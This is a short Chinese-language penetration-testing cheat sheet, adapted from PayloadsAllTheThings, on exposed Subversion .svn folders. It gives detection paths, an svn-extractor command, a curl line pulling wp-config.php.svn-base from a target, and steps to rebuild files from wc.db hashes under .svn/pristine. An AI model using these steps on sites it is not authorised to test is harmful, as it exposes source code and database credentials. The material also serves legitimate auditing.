# SVN Source Code Leak - Subversion信息泄露

[SEARCH_KEYWORDS]
漏洞类型: Information Disclosure Source Code Leak 敏感信息泄露
攻击类型: Source Code Exposure Configuration Leak
关键词: Subversion SVN .svn wc.db svn-extractor text-base pristine
技术: SVN Folder Exposure Database Download File Reconstruction
工具: svn-extractor
路径: .svn/text-base .svn/wc.db .svn/pristine

[CONTENT]

## SVN信息泄露概述

Subversion (SVN) 是一个集中式版本控制系统。当`.svn`文件夹暴露在Web服务器上时，攻击者可以下载整个源代码仓库，获取应用程序逻辑、敏感信息和凭据。

## 检测方法

检查常见SVN路径:
```
http://target.com/.svn/
http://target.com/.svn/wc.db
http://target.com/.svn/text-base/
```

## 工具

### svn-extractor

```powershell
python svn-extractor.py --url "http://target.com/.svn/"
```

工具地址: [anantshri/svn-extractor](https://github.com/anantshri/svn-extractor)

## 利用方法

### 方法1: 直接下载文件

```powershell
curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base
```

### 方法2: 数据库下载与文件重建

1. 下载SVN数据库:
```
http://server/path_to_vulnerable_site/.svn/wc.db
```

2. 解析NODES表获取文件信息:
```sql
INSERT INTO "NODES" VALUES(1,'trunk/test.txt',0,'trunk',1,'trunk/test.txt',2,'normal',NULL,NULL,'file',X'2829',NULL,'$sha1$945a60e68acc693fcb74abadb588aac1a9135f62',NULL,2,1456056344886288,'bl4de',38,1456056261000000,NULL,NULL);
```

3. 重建文件路径:
   - 移除`$sha1$`前缀
   - 添加`.svn-base`后缀
   - 使用hash的第一个字节作为`pristine/`子目录

完整路径示例:
```
http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base
```

## 风险影响

- **源代码泄露**: 获取完整应用源码
- **敏感信息暴露**: 配置文件、数据库凭据、API密钥
- **历史记录暴露**: 查看历史提交中的敏感信息

## 参考文档

原始来源: PayloadsAllTheThings/Insecure Source Code Management/Subversion.md